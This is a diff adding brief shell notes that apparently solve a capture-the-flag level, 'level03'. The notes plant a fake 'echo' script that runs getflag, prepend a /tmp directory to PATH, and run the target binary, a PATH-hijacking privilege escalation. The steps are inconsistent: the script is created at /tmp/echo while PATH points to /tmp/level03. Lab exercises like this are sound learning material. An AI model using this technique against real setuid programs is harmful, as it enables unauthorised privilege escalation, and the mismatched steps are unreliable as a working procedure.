@@ -1,0 +1,10 @@
+ltrace level03
+mkdir /tmp/level03
+touch /tmp/echo
+vim /tmp/echo
+
+#!/bin/sh
+getflag
+
+export PATH=/tmp/level03:$PATH
+./level03
